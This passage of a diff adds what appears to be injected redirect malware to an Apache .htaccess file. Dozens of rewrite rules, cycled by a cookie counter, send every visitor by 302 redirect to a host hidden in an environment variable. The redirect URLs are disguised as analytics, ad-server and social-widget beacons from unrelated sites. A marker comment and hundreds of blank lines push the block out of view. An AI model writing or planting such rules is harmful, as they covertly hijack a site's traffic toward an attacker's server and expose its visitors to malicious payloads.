+RewriteRule ^.* http://%{ENV:TiN}/__utm.gif?utmwv=5.3.3&utms=41&utmn=1586943705&utmhn=mobil.kapanlagi.com&utmcs=ISO-8859-1&utmsr=1366x768&utmvp=1349x674&utmsc=24-bit&utmul=id&utmje=1&utmfl=9.0\%20\%20r45&utmdt=KapanLagi.com:\%20Foto\%20No:\%203\%20-\%20Peugeot\%20206\%202003\%20Rp.\%2081.500.000\%20IN-1696932\%20Otosia.com&utmhid=1737341623&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/peugeot_206_sporty_in-1696932.html\%3Fimg\%3D3&utmac=UA-32725639-2&utmcc=__utma\%3D122331860.795201196.1327477948.1340753610.1340926171.56\%3B\%2B__utmz\%3D122331860.1339986923.51.15.utmcsr\%3Dkapanlagi.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/takeover.html\%3B&utmu=qB~  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11883:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 34
+RewriteRule ^.* http://%{ENV:TiN}/b/ss/marthacom,marthacomglobal/1/H.22.1/s96062286290347?AQB=1&ndh=1&t=16/6/2012\%2018:51:13\%201\%20-420&ce=UTF-8&ns=marthastewart&pageName=msl:home:center:276999:home\%20tours\%20-\%20city-homes&g=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cc=USD&ch=msl:home&server=www.marthastewart.com&events=event4&h1=msl\%7Chome\%7Chome-tours\%7Ccity-homes&c2=home/home-tours/city-homes&c4=center&c5=7:30AM&c6=Monday&c7=Weekday&v7=New&c9=msl:274749_home\%20tour\%20brooklyn\%20apartment&v9=1&c11=msl:home:center:276999:home\%20tours\%20-\%20city-homes&c12=msl:274749/home-tour-brooklyn-apartment/\%40center/276999/home-tours&v13=D\%3Dc2&v14=msl:home:center:276999:home\%20tours\%20-\%20city-homes&v15=1&v16=1&v17=1&v18=D\%3Dc6&v19=D\%3Dc5&v20=D\%3Dc7&c22=msl:274749&v22=msl:home:center:276999:home\%20tours\%20-\%20city-homes&v29=D\%3Dc4&c30=msl:home&v30=msl:home&c32=274749_home-tour\%253a-brooklyn-apartment_216533&c35=msl:home:home-tours:city-homes&v35=D\%3Dc35&v36=D\%3Dc36&v37=msl:274749&c43=core&c44=msl&v44=D\%3Dc44&s=1360x768&c=24&j=1.7&v=N&k=Y&bw=1360&bh=651&p=Shockwave\%20Flash\%3Bgomtvx\%20NIE\%20Module\%3BAdobe\%20Acrobat\%3B2007\%20Microsoft\%20Office\%20system\%3BMicrosoft\%C2\%AE\%20DRM\%3BWindows\%20Media\%20Player\%20Plug-in\%20Dynamic\%20Link\%20Library\%3B&AQE=1  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9834:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 35
+RewriteRule ^.* http://%{ENV:TiN}/gen_204?atyp=i&ct=stbc&cad=&iact=hr&ei=7aP_T6ipFYjLrQevs82oBg&q=kerupuk+bangka&tbs=&page=11&tbnh=129&tbnw=172&start=223&ndsp=23&dur=1117&tbnid=vOozhaxXSbtrgM:&hovh=194&hovw=259&vpx=468&vpy=274&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&tx=123&ty=98&zx=1342151976558  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11016:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 36
+RewriteRule ^.* http://%{ENV:TiN}/__utm.gif?utmwv=5.3.3&utms=4&utmn=1445521260&utmhn=www.clixsense.com&utmcs=UTF-8&utmsr=1366x768&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.3\%20r181&utmdt=Paid\%20to\%20Click\%20Advertising\%20at\%20ClixSense&utmhid=693385117&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/\%3F3503650&utmac=UA-6382480-2&utmcc=__utma\%3D54046458.1600929285.1341832273.1341832273.1341832273.1\%3B\%2B__utmz\%3D54046458.1341832273.1.1.utmcsr\%3Djohnwintergroup.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/\%3B&utmu=q~  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11566:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 37
+RewriteRule ^.* http://%{ENV:TiN}/delivery/lg.php?bannerid=36420&campaignid=7472&zoneid=1649&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=f4c81d922c  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9069:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 38
+RewriteRule ^.* http://%{ENV:TiN}/lg.php?bannerid=2136&campaignid=1019&zoneid=89&loc=1&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=e17930e26d  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11007:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 39
+RewriteRule ^.* http://%{ENV:TiN}/new2/www/delivery/lg.php?bannerid=10015&campaignid=3151&zoneid=517&OABLOCK=900&OASCAP=1&loc=1&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=2972534880  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:12000:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 40
+RewriteRule ^.* http://%{ENV:TiN}/t.gif?_=1341568974994&count=horizontal&id=twitter-widget-0&lang=en&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&related=brosurku&size=m&text=Promo\%2C\%20Event\%2C\%20dan\%20Diskon\%20\%7C\%20Brosurku.com&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=brosurku&type=share&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1334540162993469401883461  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11592:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 41
+RewriteRule ^.* http://%{ENV:TiN}/b?c1=8&c2=6135404&c3=28&c4=13310&c10=3380474&ns__t=1342424163036&ns_c=ISO-8859-1&c8=&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10628:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 42
+RewriteRule ^.* http://%{ENV:TiN}/f.gif?_=1341380431963&id=twitter-widget-0&lang=en&screen_name=tiket2&show_count=true&show_screen_name=true&size=m&twttr_variant=2.0&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1335934008190716654669337  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10859:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 43
+RewriteRule ^.* http://%{ENV:TiN}/__utm.gif?utmwv=5.3.2&utms=1&utmn=1383393150&utmhn=news.detik.com&utmcs=UTF-8&utmsr=1024x768&utmvp=724x638&utmsc=16-bit&utmul=en-us&utmje=0&utmfl=10.3\%20r181&utmdt=detikNews\%20:\%20Jalan\%20Panjang\%20Yahudi\%20di\%20Indonesia&utmhid=20475048&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/read/2011/05/16/170035/1640914/159/jalan-panjang-yahudi-di-indonesia\%3Fnd992203605&utmac=UA-891770-6&utmcc=__utma\%3D1.298051951.1340332615.1340332615.1340332615.1\%3B\%2B__utmz\%3D1.1340332615.1.1.utmcsr\%3Dgoogle\%7Cutmccn\%3D(organic)\%7Cutmcmd\%3Dorganic\%7Cutmctr\%3Dsinagog\%2520surabaya\%3B&utmu=qhAAAAAg~  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9279:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 44
+RewriteRule ^.* http://%{ENV:TiN}/avatar/7e75328de3c30146ca232d66a2163379?s=44&d=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&r=G  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10605:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 45
+RewriteRule ^.* http://%{ENV:TiN}/avatar/ab2b8fc9255e46f00ecbfbcd56339294?s=50&d=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&r=G  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11115:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 46
+RewriteRule ^.* http://%{ENV:TiN}/images/rt.gif?u=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&r=&ys=49B20A6A&cr=AhOEH9yANvQ&sg=/SIG\%3D13ruqgu7955l7v2177ohk4\%26b\%3D4\%26d\%3DyrAqTrtpYF6wUN6L1EW89Nafwnzn2uIlmz3fQg--\%26s\%3Dup\%26i\%3D80BaNfYP.h94qewLCsnN/1341794476/202.137.23.104/49B20A6A&yd=2452373023&t_other=t1|1170,t2|727,t3|638,t_rtpage|6357&src=FRTMA&spaceid=965640046&v=1.78&ba=3107  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10353:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 47
+RewriteRule ^.* http://%{ENV:TiN}/b?c1=2&c2=8443234&ns__t=1341878054996&ns_c=UTF-8&c8=detikcom\%20:\%20situs\%20warta\%20era\%20digital&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c9=  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9699:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 48
+RewriteRule ^.* http://%{ENV:TiN}/a/8240/13310/25502-2.html?cb=0.8598382744539398&rf=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10678:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 49
+RewriteRule ^.* http://%{ENV:TiN}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-10762&sessionID=1341916928645.55674&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/vahlia_no_hanamuko/c001/4.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.C3YmZNn0&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/vahlia_no_hanamuko/c001/3.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Vahlia\%20no\%20Hanamuko\%201\%20-\%20Read\%20Vahlia\%20no\%20Hanamuko\%20Chapter\%201\%20Online\%20-\%20Page\%204&ts1341916928647.0=  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9619:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 50
+RewriteRule ^.* http://%{ENV:TiN}/delivery/lg.php?bannerid=36709&campaignid=7505&zoneid=1656&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=6785834470  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11434:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 51
+RewriteRule ^.* http://%{ENV:TiN}/openx/www/delivery/lg.php?bannerid=3200&campaignid=1067&zoneid=2456&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=50d30ffc62  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9576:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 52
+RewriteRule ^.* http://%{ENV:TiN}/api/getCount2.php?cb=stButtons.processCB&refDomain=www.mangahere.com&refQuery=manga/chou_yo_hana_yo/v04/c018/27.html&pgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&pubKey=e47efe7d-147b-4731-ac42-9838ccdc52f2&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11360:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 53
+RewriteRule ^.* http://%{ENV:TiN}/__utm.gif?utmwv=5.3.3&utms=3&utmn=577784372&utmhn=finance.detik.com&utmcs=ISO-8859-1&utmsr=1024x768&utmvp=1007x605&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.0\%20r22&utmdt=detik\%20Finance\%20:\%20Ini\%20Alasan\%20Dahlan\%20Iskan\%20Beri\%20Izin\%20Cuti\%20Hamil\%202\%20Tahun\%20untuk\%20Pegawai\%20BUMN&utmhid=1310069990&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/read/2012/07/10/153425/1962141/4/ini-alasan-dahlan-iskan-beri-izin-cuti-hamil-2-tahun-untuk-pegawai-bumn\%3F991104topnews  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9533:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 54
+RewriteRule ^.* http://%{ENV:TiN}/url?sa=t&rct=j&q=&esrc=s&source=web&cd=15&sqi=2&ved=0CJgBEBYwDg&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ei=7FPgT5nvCMOzrAe6rdCUDQ&usg=AFQjCNGwZzeh8-E0Pp_dp5Jp7c2EseRQIA&sig2=x5UCeCnVHi7sMN03M74bVA  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:11057:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 55
+RewriteRule ^.* http://%{ENV:TiN}/imghover?iact=hm&ei=UMX-T7W-FcSmrAfJzd2-Bg&q=ibanez+jem+777&tbs=&page=2&tbnh=154&tbnw=212&start=17&ndsp=24&dur=505&tbnid=-hcz4YsPFr5VRM:&hovh=194&hovw=259&vpx=605&vpy=390&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:15,s:17,i:172&vetl=ms  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9185:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 56
+RewriteRule ^.* http://%{ENV:TiN}/__utm.gif?utmwv=5.3.3&utms=1&utmn=295508283&utmhn=tokokebaya.com&utmcs=UTF-8&utmsr=1024x768&utmvp=1024x610&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=8.0\%20\%20r22&utmdt=tokokebaya.com&utmhid=466688802&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/&utmac=UA-16192270-1&utmcc=__utma\%3D19762493.759533946.1341384264.1341384264.1341384264.1\%3B\%2B__utmz\%3D19762493.1341384264.1.1.utmcsr\%3Dgoogle\%7Cutmccn\%3D(organic)\%7Cutmcmd\%3Dorganic\%7Cutmctr\%3Dtoko\%2520kebaya\%3B&utmu=D~  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:10882:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 57
+RewriteRule ^.* http://%{ENV:TiN}/delivery/lg.php?bannerid=30554&campaignid=2475&zoneid=1843&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=a556f69651  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9341:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 58
+RewriteRule ^.* http://%{ENV:TiN}/delivery/lg.php?bannerid=1960&campaignid=964&zoneid=542&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=fdc5acd5fa  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9948:/:0:HttpOnly]
+RewriteCond %{ENV:Gxb} 59
+RewriteRule ^.* http://%{ENV:TiN}/__utm.gif?utmwv=5.3.3&utms=49&utmn=216011879&utmhn=motor-dan-sekuter.tokobagus.com&utmcs=UTF-8&utmsr=1024x768&utmvp=1008x622&utmsc=16-bit&utmul=en-us&utmje=0&utmfl=10.3\%20r181&utmdt=YAMAHA\%20BYSON\%20\%272011\%20(OVER\%20CREDIT)\%20-\%20Tokobagus.com&utmhid=157779642&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/yamaha/yamaha-byson-2011-over-credit-9810000.html&utmac=UA-5908313-1&utmcc=__utma\%3D223717764.525864053.1341289968.1341289968.1341289968.1\%3B\%2B__utmz\%3D223717764.1341289968.1.1.utmcsr\%3Dfacebook\%7Cutmccn\%3Dfacebook_mobil_veloz\%7Cutmcmd\%3Dcpc\%7Cutmcct\%3Dmotor_honda_cbr_8\%3B&utmu=qBIAAC~  [R=302,NE,L,CO=Gxb:%{ENV:Gxb}:%{HTTP_HOST}:9632:/:0:HttpOnly]
+
+</IfModule>
+#dd70d475b9a79a953e46c18690d957f7c88873f526c7176b7546f425
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
